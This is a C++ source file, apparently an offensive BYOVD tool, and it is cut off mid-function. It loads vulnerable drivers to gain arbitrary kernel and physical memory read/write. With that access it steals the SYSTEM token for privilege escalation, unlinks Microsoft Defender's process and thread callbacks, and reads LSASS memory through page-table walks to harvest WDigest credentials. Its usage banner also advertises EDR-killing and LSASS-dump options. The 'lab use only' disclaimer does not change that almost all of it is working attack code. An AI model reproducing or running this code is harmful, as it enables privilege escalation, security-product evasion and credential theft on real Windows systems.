/*
 * cascade.cpp - Consolidated BYOVD tool
 *
 * Combines warp.cpp (PPL strip + LSASS dump) with UsingBYOVD physical-memory
 * R/W primitives (BiosToolCommonDriver / ktapi).  Drops and loads the vulnerable
 * driver at runtime from a user-supplied path; no embedded binary required.
 *
 * Providers supported (--driver-type):
 *   biostool  - BiosToolCommonDriver.sys (IOCTLs: 0x22202C/0x222030/0x222034)
 *   ktapi     - ktapi.sys (IOCTLs: 0x82007000 map / 0x82007100 unmap)
 *   pdfwkrnl  - PdFwKrnl.sys already loaded (legacy warp.cpp backend, no drop/load)
 *
 * EPROCESS offsets auto-selected by Windows build number; offset scanning
 * fallback from warp.cpp kept as belt-and-suspenders.
 *
 * Usage:
 *   cascade --test-rw   --driver .\BiosToolCommonDriver.sys
 *   cascade --dry-run   --driver .\BiosToolCommonDriver.sys
 *   cascade --priv-esc  --driver .\BiosToolCommonDriver.sys
 *   cascade --dump --out C:\Temp\lo.dmp --driver .\BiosToolCommonDriver.sys
 *   cascade --kill-edr  --driver .\BiosToolCommonDriver.sys
 *   cascade --decode --in lo.dmp --out lo.dmp.dec
 *
 * Requires: administrator, SeLoadDriverPrivilege.
 * Safe by default: without --dump/--priv-esc/--kill-edr nothing is modified.
 *
 * Lab-authorized BYOVD research tool. Isolated lab use only.
 */

#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "advapi32.lib")

typedef unsigned long long QWORD;
typedef LONG NTSTATUS;

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0)
#endif

// ---------------------------------------------------------------------------
// Undocumented NT APIs
// ---------------------------------------------------------------------------
typedef struct _UNICODE_STRING_W {
    USHORT Length;
    USHORT MaximumLength;
    LPWSTR Buffer;
} UNICODE_STRING_W, *PUNICODE_STRING_W;

typedef NTSTATUS(NTAPI* NtLoadDriver_t)(PUNICODE_STRING_W RegistryPath);
typedef NTSTATUS(NTAPI* NtUnloadDriver_t)(PUNICODE_STRING_W RegistryPath);
typedef NTSTATUS(NTAPI* NtCreateProcessEx_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG,
    HANDLE, HANDLE, HANDLE, ULONG);

static NtLoadDriver_t   g_NtLoadDriver   = nullptr;
static NtUnloadDriver_t g_NtUnloadDriver = nullptr;

// ---------------------------------------------------------------------------
// Provider types
// ---------------------------------------------------------------------------
enum class ProviderType { BiosTool, Ktapi, PdfwKrnl };

struct Config {
    ProviderType type    = ProviderType::BiosTool;
    std::string  drvPath;     // path to .sys on disk (empty = already loaded)
    bool         dryRun      = false;
    bool         testRw      = false;
    bool         doPrivEsc   = false;
    bool         doDump      = false;
    bool         doDumpRpm      = false;  // ReadProcessMemory-based dump (no thread suspension)
    bool         doDumpKernel    = false;  // CR3-based kernel dump (bypasses Defender callback)
    bool         doPatchCallbacks= false;  // patch Defender's ObCallback PreOperation
    bool         killEdr     = false;
    bool         doDecode    = false;
    bool         noXor       = false;
    std::string  outPath;
    std::string  inPath;
    DWORD        targetPid   = 0;
};

// ---------------------------------------------------------------------------
// EPROCESS offsets (build-dynamic, from UsingBYOVD Main.cpp analysis)
// ---------------------------------------------------------------------------
struct KernelOffsets {
    ULONG64 UniqueProcessId    = 0;
    ULONG64 ActiveProcessLinks = 0;
    ULONG64 ImageFileName      = 0;
    ULONG64 Protection         = 0;
    ULONG64 Token              = 0;
};
static KernelOffsets g_off;

static void SetOffsetsByBuild(DWORD build) {
    // UniqueProcessId and ActiveProcessLinks are stable across modern builds
    // (NT 6.1+). Verified in public symbols.
    g_off.UniqueProcessId    = 0x440;
    g_off.ActiveProcessLinks = 0x448;

    if (build >= 26100) {
        // Windows 11 24H2+
        g_off.Token         = 0x248;
        g_off.Protection    = 0x5FA;
        g_off.ImageFileName = 0x338;
    } else if (build >= 22000) {
        // Windows 11 21H2 / 22H2 (22000, 22621)
        g_off.Token         = 0x4B8;
        g_off.Protection    = 0x87A;
        g_off.ImageFileName = 0x5A8;
        // Adjust UniqueProcessId / APL for this family
        g_off.UniqueProcessId    = 0x440;
        g_off.ActiveProcessLinks = 0x448;
    } else if (build >= 19041) {
        // Windows 10 20H1 - 21H2
        g_off.Token         = 0x4B8;
        g_off.Protection    = 0x87A;
        g_off.ImageFileName = 0x5A8;
        g_off.UniqueProcessId    = 0x440;
        g_off.ActiveProcessLinks = 0x448;
    } else if (build >= 18362) {
        // Windows 10 1903
        g_off.Token         = 0x360;
        g_off.Protection    = 0x6FA;
        g_off.ImageFileName = 0x450;
    } else {
        // Fallback (older builds)
        g_off.Token         = 0x358;
        g_off.Protection    = 0x6CA;
        g_off.ImageFileName = 0x448;
    }
    printf("[*] Build %lu: UniqueProcessId=0x%llX APL=0x%llX FileName=0x%llX Protection=0x%llX Token=0x%llX\n",
        build,
        g_off.UniqueProcessId,
        g_off.ActiveProcessLinks,
        g_off.ImageFileName,
        g_off.Protection,
        g_off.Token);
}

static DWORD GetWindowsBuild() {
    HKEY hk;
    DWORD build = 0, sz = sizeof(build);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        0, KEY_READ, &hk) == ERROR_SUCCESS) {
        RegQueryValueExA(hk, "CurrentBuildNumber", nullptr, nullptr,
            (LPBYTE)&build, &sz);
        if (!build) {
            char buf[16]{};
            sz = sizeof(buf);
            if (RegQueryValueExA(hk, "CurrentBuildNumber", nullptr, nullptr,
                (LPBYTE)buf, &sz) == ERROR_SUCCESS)
                build = (DWORD)atol(buf);
        }
        RegCloseKey(hk);
    }
    return build;
}

// ---------------------------------------------------------------------------
// Privilege helper
// ---------------------------------------------------------------------------
static bool EnablePrivilege(const char* privName) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    LUID luid{};
    bool ok = false;
    if (LookupPrivilegeValueA(nullptr, privName, &luid)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr)
            && GetLastError() == ERROR_SUCCESS;
    }
    CloseHandle(hToken);
    return ok;
}

// ---------------------------------------------------------------------------
// Driver management (drop, load, unload)
// ---------------------------------------------------------------------------
static std::wstring g_svcName;   // service name derived from driver filename
static std::wstring g_regPath;   // \Registry\Machine\...\<svc>
static std::wstring g_dropPath;  // actual .sys path on disk (may == drvPath)

static std::wstring Utf8ToWide(const std::string& s) {
    if (s.empty()) return {};
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
    std::wstring w(n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, w.data(), n);
    return w;
}

static std::string WideToUtf8(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string s(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, s.data(), n, nullptr, nullptr);
    return s;
}

// Derive service name from filename without extension.
static std::wstring SvcNameFromPath(const std::wstring& path) {
    auto pos = path.rfind(L'\\');
    std::wstring base = (pos == std::wstring::npos) ? path : path.substr(pos + 1);
    auto dot = base.rfind(L'.');
    if (dot != std::wstring::npos) base = base.substr(0, dot);
    return base;
}

static bool CopyDriverToTemp(const std::wstring& srcPath, std::wstring& outDest) {
    wchar_t temp[MAX_PATH]{};
    GetTempPathW(MAX_PATH, temp);
    // Use pid-stamped name to avoid same-file collision when src is already in %TEMP%
    DWORD pid = GetCurrentProcessId();
    std::wstring name = SvcNameFromPath(srcPath) + L"_" + std::to_wstring(pid) + L".sys";
    outDest = std::wstring(temp) + name;

    // Resolve src to full path to detect same-file scenario
    wchar_t srcFull[MAX_PATH]{}, dstFull[MAX_PATH]{};
    GetFullPathNameW(srcPath.c_str(), MAX_PATH, srcFull, nullptr);
    GetFullPathNameW(outDest.c_str(), MAX_PATH, dstFull, nullptr);
    if (_wcsicmp(srcFull, dstFull) == 0) {
        // Source is already our dest; use as-is
        return true;
    }

    if (!CopyFileW(srcPath.c_str(), outDest.c_str(), FALSE)) {
        printf("[-] CopyFile %s -> %s failed (%lu)\n",
            WideToUtf8(srcPath).c_str(), WideToUtf8(outDest).c_str(), GetLastError());
        return false;
    }
    return true;
}

static bool CreateDriverService(const std::wstring& svcName, const std::wstring& sysPath) {
    // Build NT-style path for ImagePath
    std::wstring ntPath = L"\\??\\" + sysPath;

    // Open Services key
    std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + svcName;
    HKEY hk;
    LONG rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, nullptr,
        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, nullptr, &hk, nullptr);
    if (rc != ERROR_SUCCESS) {
        printf("[-] RegCreateKey failed (%ld)\n", rc);
        return false;
    }

    DWORD type = 1;   // SERVICE_KERNEL_DRIVER
    DWORD start = 3;  // SERVICE_DEMAND_START
    DWORD err = 1;    // SERVICE_ERROR_NORMAL
    RegSetValueExW(hk, L"Type",         0, REG_DWORD, (BYTE*)&type,  sizeof(type));
    RegSetValueExW(hk, L"Start",        0, REG_DWORD, (BYTE*)&start, sizeof(start));
    RegSetValueExW(hk, L"ErrorControl", 0, REG_DWORD, (BYTE*)&err,   sizeof(err));
    RegSetValueExW(hk, L"ImagePath",    0, REG_EXPAND_SZ,
        (BYTE*)ntPath.c_str(), (DWORD)((ntPath.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hk);
    return true;
}

static bool LoadDriverViaNt(const std::wstring& regPath) {
    UNICODE_STRING_W us{};
    us.Buffer = (LPWSTR)regPath.c_str();
    us.Length = (USHORT)(regPath.size() * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);
    NTSTATUS st = g_NtLoadDriver(&us);
    if (!NT_SUCCESS(st)
        && st != (LONG)0xC000010E   /* STATUS_IMAGE_ALREADY_LOADED: service already running */
        && st != (LONG)0xC0000035   /* STATUS_OBJECT_NAME_COLLISION: device already registered by a prior load */
    ) {
        printf("[-] NtLoadDriver failed: 0x%08lX\n", st);
        return false;
    }
    printf("[+] NtLoadDriver: 0x%08lX\n", st);
    return true;
}

static bool UnloadDriverViaNt(const std::wstring& regPath) {
    if (!g_NtUnloadDriver) return false;
    UNICODE_STRING_W us{};
    us.Buffer = (LPWSTR)regPath.c_str();
    us.Length = (USHORT)(regPath.size() * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);
    NTSTATUS st = g_NtUnloadDriver(&us);
    printf("[*] NtUnloadDriver: 0x%08lX\n", st);
    return NT_SUCCESS(st);
}

static void DeleteServiceKey(const std::wstring& svcName) {
    std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + svcName;
    RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
}

// ---------------------------------------------------------------------------
// Kernel R/W - BiosToolCommonDriver backend
// ---------------------------------------------------------------------------
// Device name: \\.\BiosToolCommonDriver
static HANDLE g_biostoolDev = INVALID_HANDLE_VALUE;

#define BIOSTOOL_READ_PHYS  0x22202Cu
#define BIOSTOOL_WRITE_PHYS 0x222030u
#define BIOSTOOL_VA2PA      0x222034u

static PVOID BiosTool_Va2Pa(PVOID va) {
    struct { PVOID VA; PVOID PA; } req{va, nullptr};
    DWORD ret = 0;
    if (!DeviceIoControl(g_biostoolDev, BIOSTOOL_VA2PA,
        &req, sizeof(req), &req, sizeof(req), &ret, nullptr))
        return nullptr;
    return req.PA;
}

static bool BiosTool_ReadPhys(PVOID pa, SIZE_T size, PVOID buf) {
    // Max chunk = 0x1000 bytes; driver returns data with 8-byte prefix
    auto pCurPA  = (PUCHAR)pa;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG_PTR pageOff = (ULONG_PTR)pCurPA & 0xFFF;
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)(0x1000 - pageOff));
        struct { PVOID PA; ULONG Size; ULONG Pad; } req{pCurPA, chunk, 0};
        BYTE tmp[0x1008]{};
        DWORD got = 0;
        if (!DeviceIoControl(g_biostoolDev, BIOSTOOL_READ_PHYS,
            &req, sizeof(req), tmp, sizeof(tmp), &got, nullptr))
            return false;
        memcpy(pCurBuf, tmp + 8, chunk);
        pCurPA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool BiosTool_WritePhys(PVOID pa, SIZE_T size, PVOID data) {
    // Max chunk = 0x1000
    auto pCurPA   = (PUCHAR)pa;
    auto pCurData = (PUCHAR)data;
    while (size > 0) {
        ULONG_PTR pageOff = (ULONG_PTR)pCurPA & 0xFFF;
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)(0x1000 - pageOff));
        struct { ULONG Size; ULONG Pad; PUCHAR Data; PVOID PA; }
            req{ chunk, 0, pCurData, pCurPA };
        DWORD got = 0;
        if (!DeviceIoControl(g_biostoolDev, BIOSTOOL_WRITE_PHYS,
            &req, sizeof(req), &req, sizeof(req), &got, nullptr))
            return false;
        pCurPA   += chunk;
        pCurData += chunk;
        size     -= chunk;
    }
    return true;
}

static bool BiosTool_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = BiosTool_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!BiosTool_ReadPhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool BiosTool_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = BiosTool_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!BiosTool_WritePhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Kernel R/W - PdFwKrnl backend (legacy, no load/drop)
// ---------------------------------------------------------------------------
static HANDLE g_pdfwDev = INVALID_HANDLE_VALUE;
#define IOCTL_AMDPDFW_MEMCPY 0x80002014

typedef struct { BYTE r[16]; PVOID Dst; PVOID Src; PVOID r2; DWORD Size; DWORD r3; } PDFW_REQ;

static bool PdfwKrnl_KRead(QWORD addr, PVOID buf, DWORD size) {
    PDFW_REQ r{}; r.Dst = buf; r.Src = (PVOID)addr; r.Size = size;
    DWORD got = 0;
    return DeviceIoControl(g_pdfwDev, IOCTL_AMDPDFW_MEMCPY, &r, sizeof(r), &r, sizeof(r), &got, nullptr);
}

static bool PdfwKrnl_KWrite(QWORD addr, PVOID buf, DWORD size) {
    PDFW_REQ r{}; r.Dst = (PVOID)addr; r.Src = buf; r.Size = size;
    DWORD got = 0;
    return DeviceIoControl(g_pdfwDev, IOCTL_AMDPDFW_MEMCPY, &r, sizeof(r), &r, sizeof(r), &got, nullptr);
}

// ---------------------------------------------------------------------------
// Unified R/W dispatch
// ---------------------------------------------------------------------------
static ProviderType g_activeProvider;

static bool KRead(QWORD addr, PVOID buf, SIZE_T size) {
    switch (g_activeProvider) {
    case ProviderType::BiosTool:
        return BiosTool_KRead(addr, buf, size);
    case ProviderType::PdfwKrnl:
        return PdfwKrnl_KRead(addr, buf, (DWORD)size);
    default:
        return false;
    }
}

static bool KWrite(QWORD addr, PVOID buf, SIZE_T size) {
    switch (g_activeProvider) {
    case ProviderType::BiosTool:
        return BiosTool_KWrite(addr, buf, size);
    case ProviderType::PdfwKrnl:
        return PdfwKrnl_KWrite(addr, buf, (DWORD)size);
    default:
        return false;
    }
}

static QWORD KReadQword(QWORD addr) {
    QWORD v = 0;
    KRead(addr, &v, 8);
    return v;
}

// ---------------------------------------------------------------------------
// Offset scanning (from warp.cpp, extended range)
// ---------------------------------------------------------------------------
static bool LooksLikeName(QWORD eproc, QWORD off) {
    BYTE b[16]{};
    if (!KRead(eproc + off, b, 16)) return false;
    int ok = 0;
    for (int i = 0; i < 15; i++) {
        if (!b[i]) break;
        if (b[i] >= 0x20 && b[i] < 0x7f) ok++;
    }
    return ok >= 3;
}

static bool LooksLikeProtection(QWORD eproc, QWORD off) {
    BYTE b = 0xFF;
    if (!KRead(eproc + off, &b, 1)) return false;
    return b <= 0x3F; // PPL levels 0..7 per nibble, practically 0..3
}

static void ScanAndFixOffsets(QWORD eproc, DWORD pid) {
    if (!LooksLikeName(eproc, g_off.ImageFileName)) {
        for (QWORD s = 0x300; s <= 0x700; s += 8) {
            if (LooksLikeName(eproc, s)) {
                printf("[*] ImageFileName scanned to 0x%llX (was 0x%llX)\n", s, g_off.ImageFileName);
                g_off.ImageFileName = s;
                break;
            }
        }
    }
    if (!LooksLikeProtection(eproc, g_off.Protection)) {
        for (QWORD s = 0x500; s <= 0xA00; s += 8) {
            if (LooksLikeProtection(eproc, s)) {
                printf("[*] Protection scanned to 0x%llX (was 0x%llX)\n", s, g_off.Protection);
                g_off.Protection = s;
                break;
            }
        }
    }
}

// ---------------------------------------------------------------------------
// PsInitialSystemProcess offset from ntoskrnl export
// ---------------------------------------------------------------------------
static QWORD PsISPOffset() {
    HMODULE ntos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!ntos) return 0;
    FARPROC p = GetProcAddress(ntos, "PsInitialSystemProcess");
    QWORD off = p ? ((QWORD)p - (QWORD)ntos) : 0;
    FreeLibrary(ntos);
    return off;
}

// ---------------------------------------------------------------------------
// Process walker
// ---------------------------------------------------------------------------
static QWORD FindEprocessByPid(QWORD sysEproc, DWORD pid, char name[16]) {
    QWORD head  = sysEproc + g_off.ActiveProcessLinks;
    QWORD flink = KReadQword(head);
    int guard = 0;
    while (flink && flink != head && guard++ < 10000) {
        QWORD ep  = flink - g_off.ActiveProcessLinks;
        QWORD cur = KReadQword(ep + g_off.UniqueProcessId);
        if ((DWORD)cur == pid) {
            if (name) { KRead(ep + g_off.ImageFileName, name, 15); name[15] = 0; }
            return ep;
        }
        flink = KReadQword(ep + g_off.ActiveProcessLinks);
    }
    return 0;
}

static QWORD FindEprocessByName(QWORD sysEproc, const char* target) {
    QWORD head  = sysEproc + g_off.ActiveProcessLinks;
    QWORD flink = KReadQword(head);
    int guard = 0;
    while (flink && flink != head && guard++ < 10000) {
        QWORD ep = flink - g_off.ActiveProcessLinks;
        char nm[16]{};
        KRead(ep + g_off.ImageFileName, nm, 15);
        if (_stricmp(nm, target) == 0) return ep;
        flink = KReadQword(ep + g_off.ActiveProcessLinks);
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Get ntoskrnl base + System EPROCESS
// ---------------------------------------------------------------------------
struct KernelBase { QWORD ntosBase; QWORD systemEproc; };

static KernelBase GetKernelBase() {
    KernelBase r{};
    LPVOID drvs[1024];
    DWORD cb;
    if (EnumDeviceDrivers(drvs, sizeof(drvs), &cb))
        r.ntosBase = (QWORD)drvs[0];
    if (!r.ntosBase) return r;

    QWORD sysOff = PsISPOffset();
    if (!sysOff) return r;

    r.systemEproc = KReadQword(r.ntosBase + sysOff);
    return r;
}

// ---------------------------------------------------------------------------
// Token steal (UsingBYOVD PrivilegeEscalation)
// ---------------------------------------------------------------------------
static bool TokenSteal(QWORD sysEproc, DWORD targetPid) {
    // Read SYSTEM token
    QWORD sysToken = KReadQword(sysEproc + g_off.Token) & ~0xFULL; // clear ref count bits
    if (!sysToken) {
        printf("[-] Failed to read SYSTEM token\n");
        return false;
    }
    printf("[+] SYSTEM token: 0x%llX\n", sysToken);

    // Find target EPROCESS
    char nm[16]{};
    QWORD targetEp = FindEprocessByPid(sysEproc, targetPid, nm);
    if (!targetEp) {
        printf("[-] Target PID %lu not found in EPROCESS list\n", targetPid);
        return false;
    }
    printf("[+] Target EPROCESS 0x%llX (%s)\n", targetEp, nm);

    // Read current token
    QWORD curToken = KReadQword(targetEp + g_off.Token);
    printf("[*] Current token: 0x%llX -> stealing SYSTEM token\n", curToken);

    // Write SYSTEM token (preserve low-nibble ref count bits from original)
    QWORD newToken = sysToken | (curToken & 0xF);
    if (!KWrite(targetEp + g_off.Token, &newToken, 8)) {
        printf("[-] KWrite token failed\n");
        return false;
    }

    // Verify
    QWORD check = KReadQword(targetEp + g_off.Token);
    printf("[!!!] Token written: 0x%llX (verify: 0x%llX)\n", newToken, check);
    return true;
}

// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------
// ObCallback patch: zero out Defender's PreOperation callback so OpenProcess
// is no longer stripped of PROCESS_VM_READ on LSASS.
// Works because HVCI is OFF so kernel code pages are writable via phys R/W.
// ---------------------------------------------------------------------------

// Parse ntoskrnl PE export directory to find a named export address.
static QWORD FindNtosExport(QWORD ntosBase, const char* symName) {
    DWORD peOff = 0;
    KRead(ntosBase + 0x3C, &peOff, 4);
    if (!peOff || peOff > 0x1000) return 0;

    DWORD eDirRva = 0, numNames = 0, numFuncs = 0;
    DWORD namesRVA = 0, funcsRVA = 0, ordsRVA = 0;
    KRead(ntosBase + peOff + 0x88, &eDirRva, 4);  // OptHeader.ExportRVA
    if (!eDirRva) return 0;
    QWORD eDir = ntosBase + eDirRva;
    KRead(eDir + 0x14, &numFuncs, 4);
    KRead(eDir + 0x18, &numNames, 4);
    KRead(eDir + 0x1C, &funcsRVA, 4);
    KRead(eDir + 0x20, &namesRVA, 4);
    KRead(eDir + 0x24, &ordsRVA, 4);

    size_t targLen = strlen(symName);
    for (DWORD i = 0; i < numNames && i < 100000; i++) {
        DWORD nameRVA = 0;
        KRead(ntosBase + namesRVA + (QWORD)i * 4, &nameRVA, 4);
        if (!nameRVA) continue;
        char buf[256]{};
        KRead(ntosBase + nameRVA, buf, (DWORD)std::min(targLen + 2, (size_t)255));
        if (memcmp(buf, symName, targLen) == 0 && buf[targLen] == 0) {
            WORD ord = 0;
            KRead(ntosBase + ordsRVA + (QWORD)i * 2, &ord, 2);
            DWORD funcRVA = 0;
            KRead(ntosBase + funcsRVA + (QWORD)ord * 4, &funcRVA, 4);
            return ntosBase + funcRVA;
        }
    }
    return 0;
}

// Walk PsProcessType->CallbackList and patch all PreOperation callbacks.
// Each callback entry (OB_CALLBACK_ENTRY, undocumented, stable Win10/11):
//   +0x00 LIST_ENTRY (Flink, Blink)
//   +0x10 Operations (DWORD)
//   +0x14 Enabled    (DWORD)
//   +0x18 Registration* (pointer to OB_REGISTRATION block)
//   +0x20 ObjectType*
//   +0x28 PreOperation*
//   +0x30 PostOperation*
// OBJECT_TYPE.CallbackList is at offset 0xC8 (stable Win10/11).
// Unlink all entries from an OBJECT_TYPE.CallbackList at listHead.
static void UnlinkCallbackList(const char* typeName, QWORD listHead) {
    QWORD flink = KReadQword(listHead);
    if (flink == listHead || !flink) {
        printf("[+] %s CallbackList already empty\n", typeName);
        return;
    }
    QWORD entry = flink;
    int seen = 0;
    while (entry && entry != listHead && seen < 64) {
        QWORD pre  = KReadQword(entry + 0x28);
        QWORD post = KReadQword(entry + 0x30);
        printf("[*]   %s entry[%d] 0x%llX: pre=0x%llX post=0x%llX\n", typeName, seen, entry, pre, post);
        entry = KReadQword(entry);
        seen++;
    }
    printf("[*] Unlinking %d %s callback(s)...\n", seen, typeName);
    if (!KWrite(listHead,     &listHead, 8) ||
        !KWrite(listHead + 8, &listHead, 8)) {
        printf("[-] KWrite %s CallbackList unlink failed\n", typeName);
        return;
    }
    printf("[+] %s ObCallback list unlinked (%d entries)\n", typeName, seen);
}

static bool PatchObCallbacks(QWORD ntosBase) {
    // Unlink Process callbacks (restricts OpenProcess access to LSASS)
    QWORD psProcTypeAddr = FindNtosExport(ntosBase, "PsProcessType");
    if (!psProcTypeAddr) { printf("[-] PsProcessType export not found\n"); return false; }
    QWORD procObjType = KReadQword(psProcTypeAddr);
    if (!procObjType) { printf("[-] *PsProcessType is NULL\n"); return false; }
    printf("[*] OBJECT_TYPE (Process): 0x%llX\n", procObjType);
    UnlinkCallbackList("Process", procObjType + 0xC8);

    // Unlink Thread callbacks (restricts NtSuspendThread inside MiniDumpWriteDump)
    QWORD psThreadTypeAddr = FindNtosExport(ntosBase, "PsThreadType");
    if (psThreadTypeAddr) {
        QWORD threadObjType = KReadQword(psThreadTypeAddr);
        if (threadObjType) {
            printf("[*] OBJECT_TYPE (Thread): 0x%llX\n", threadObjType);
            UnlinkCallbackList("Thread", threadObjType + 0xC8);
        }
    }
    return true;
}

// CR3-based page table walk (read any process memory at physical level)
// Bypasses Defender's ObRegisterCallbacks OpenProcess interception.
// ---------------------------------------------------------------------------

// Read a 64-bit value from physical address using BiosTool (raw, page-aligned)
static QWORD PhysReadQword(QWORD physAddr) {
    QWORD v = 0;
    BiosTool_ReadPhys((PVOID)physAddr, 8, &v);
    return v;
}

// Walk 4-level page tables to translate VA -> PA in a given process (using its CR3)
// Returns 0 if VA is not mapped.
static QWORD Cr3VaToPa(QWORD cr3, QWORD va) {
    QWORD pml4_idx = (va >> 39) & 0x1FF;
    QWORD pdpt_idx = (va >> 30) & 0x1FF;
    QWORD pd_idx   = (va >> 21) & 0x1FF;
    QWORD pt_idx   = (va >> 12) & 0x1FF;
    QWORD offset   = va & 0xFFF;

    QWORD pml4e = PhysReadQword((cr3 & ~0xFFFULL) + pml4_idx * 8);
    if (!(pml4e & 1)) return 0;
    QWORD pdpt_pa = pml4e & 0x000FFFFFFFFFF000ULL;

    QWORD pdpte = PhysReadQword(pdpt_pa + pdpt_idx * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) // 1GB page
        return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
    QWORD pd_pa = pdpte & 0x000FFFFFFFFFF000ULL;

    QWORD pde = PhysReadQword(pd_pa + pd_idx * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) // 2MB large page
        return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
    QWORD pt_pa = pde & 0x000FFFFFFFFFF000ULL;

    QWORD pte = PhysReadQword(pt_pa + pt_idx * 8);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | offset;
}

// Read bytes from a foreign process's virtual address using CR3 page walk.
// No OpenProcess or handle needed -- completely invisible to Defender callbacks.
static bool PhysReadProcessMemory(QWORD cr3, QWORD va, PVOID buf, SIZE_T size) {
    auto pOut = (PUCHAR)buf;
    while (size > 0) {
        QWORD pageOff = va & 0xFFF;
        QWORD chunk   = std::min(size, (SIZE_T)(0x1000 - pageOff));
        QWORD pa = Cr3VaToPa(cr3, va);
        if (!pa) {
            memset(pOut, 0, chunk);  // unmapped - zero fill
        } else {
            if (!BiosTool_ReadPhys((PVOID)pa, chunk, pOut)) return false;
        }
        va   += chunk;
        pOut += chunk;
        size -= chunk;
    }
    return true;
}

// Scan LSASS memory for the WDigest credential cache signature and dump
// a small region around each match. No OpenProcess required.
// Format: "WDIG_CRED\0" marker + 128-byte region for each hit
static bool ScanLsassWDigest(QWORD lsassEproc, QWORD cr3, const char* outPath) {
    // DirectoryTableBase is at KPROCESS offset 0x28 (stable, first field of KPROCESS)
    // But we already have cr3 passed in.

    // Scan LSASS user-mode address range [0x10000 .. 0x7FFF_FFFF_FFFF]
    // Look for WDigest signature patterns: wchar "NTLM\0" or "lsasrv\0"
    printf("[*] Scanning LSASS process memory via CR3 0x%llX...\n", cr3);

    // Enumerate LSASS regions via NtQueryVirtualMemory (needs PROCESS_QUERY_INFORMATION)
    typedef NTSTATUS(NTAPI* NtQVM_t)(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtQVM = (NtQVM_t)GetProcAddress(ntdll, "NtQueryVirtualMemory");
    if (!NtQVM) { printf("[-] NtQueryVirtualMemory not found\n"); return false; }

    // Open with minimal rights - PROCESS_QUERY_INFORMATION only
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION,
                               FALSE, (DWORD)KReadQword(lsassEproc + g_off.UniqueProcessId));
    if (!hProc) {
        printf("[-] OpenProcess(QUERY_INFO) failed (%lu), trying limited...\n", GetLastError());
        hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE,
                            (DWORD)KReadQword(lsassEproc + g_off.UniqueProcessId));
    }
    if (!hProc) { printf("[-] Cannot open LSASS even with query-only access (%lu)\n", GetLastError()); return false; }
    printf("[+] LSASS handle (query-only): 0x%p\n", hProc);

    HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hOut == INVALID_HANDLE_VALUE) { CloseHandle(hProc); return false; }

    struct { char magic[8]; QWORD va; QWORD size; } regionHdr;
